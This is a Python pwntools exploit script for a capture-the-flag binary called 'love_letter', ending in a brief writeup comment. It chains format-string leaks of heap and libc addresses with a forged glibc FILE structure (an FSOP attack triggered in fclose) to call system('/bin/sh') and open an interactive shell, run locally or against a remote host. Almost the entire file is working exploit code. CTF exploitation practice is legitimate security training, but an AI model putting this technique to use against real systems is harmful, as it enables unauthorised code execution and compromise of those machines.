#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./love_letter")
    if args.GDB:
        gdb.attach(r,'b *__libio_codecvt_in\nb *_IO_wfile_underflow')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

def create(name,content, password=False):
    sla("Choice: ",'1')
    sla("> ",name)
    sla("> ",content)
    sla("> ", 'y' if password else 'n')
def change(idx, name, content):
    sla("Choice: ",'2')
    sla("> ",str(idx))
    sla(": ",name)
    sla(": ", content)

def show(idx):
    sla("Choice: ",'3')
    sla("> ",str(idx))
def remove(idx):
    sla("Choice: ",'4')
    sla("> ",str(idx))
def save(name):
    sla("Choice: ",'5')
    sla("> ",name)
# FMT Leaks
create("%7$p","aaa")
show(1)
ru("Author: ")
heap = int(r.recvuntil("\n")[:-1],16)
create("%3$p","aaa")
show(2)
ru("Author: ")
libc = int(r.recvuntil("\n")[:-1],16) - 0x114a37
# https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#3---the-fsop-way-targetting-stdout
system = libc + 0x50d60
stdout_lock = libc + 0x21ba70	# _IO_stdfile_1_lock  (symbol not exported)
stdout = libc + 0x21a780
fake_vtable = libc+0x2160c0-0x18
gadget = libc + 0x163830 # add rdi, 0x10 ; jmp rcx
fake_io = heap + 0x1870
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=system		# the function that we will call
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')	# will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= fake_io + 0xb8
fake._wide_data = heap+0x1000		# _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(fake_io+0x20)+p64(0)*3+p64(fake_vtable)
save(b"A"*(256+8)+p64(0x1e1)+bytes(fake))
leak("heap",hex(heap))
leak("libc",hex(libc))


r.interactive()

'''
Writeup:
FSOP in save note can overflow the fp. Will trigger FSOP in fclose.
However the overflow length is not enough for typical house of apple/house of cat
Find a shorter chain instead.
'''